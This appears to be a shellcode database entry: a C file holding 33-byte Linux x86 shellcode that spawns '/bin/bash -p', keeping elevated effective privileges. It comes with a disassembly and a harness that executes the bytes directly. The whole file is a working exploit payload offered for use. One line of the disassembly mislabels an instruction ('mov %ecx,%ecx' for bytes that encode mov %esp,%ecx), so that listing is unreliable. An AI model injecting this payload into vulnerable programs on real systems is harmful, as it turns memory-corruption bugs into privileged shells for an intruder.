/*

Title: 	Linux x86 - execve("/bin/bash", ["/bin/bash", "-p"], NULL) - 33 bytes
Author:	Jonathan Salwan
Mail:	submit@shell-storm.org
Web:	http://www.shell-storm.org

!Database of Shellcodes http://www.shell-storm.org/shellcode/


sh sets (euid, egid) to (uid, gid) if -p not supplied and uid < 100
Read more: http://www.faqs.org/faqs/unix-faq/shell/bash/#ixzz0mzPmJC49

sassembly of section .text:

08048054 <.text>:
 8048054:	6a 0b                	push   $0xb
 8048056:	58                   	pop    %eax
 8048057:	99                   	cltd
 8048058:	52                   	push   %edx
 8048059:	66 68 2d 70          	pushw  $0x702d
 804805d:	89 e1                	mov    %esp,%ecx
 804805f:	52                   	push   %edx
 8048060:	6a 68                	push   $0x68
 8048062:	68 2f 62 61 73       	push   $0x7361622f
 8048067:	68 2f 62 69 6e       	push   $0x6e69622f
 804806c:	89 e3                	mov    %esp,%ebx
 804806e:	52                   	push   %edx
 804806f:	51                   	push   %ecx
 8048070:	53                   	push   %ebx
 8048071:	89 e1                	mov    %ecx,%ecx
 8048073:	cd 80                	int    $0x80

*/

#include <stdio.h>

char shellcode[] = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
		   "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
		   "\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
		   "\x51\x53\x89\xe1\xcd\x80";

int main(int argc, char *argv[])
{
       	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();
}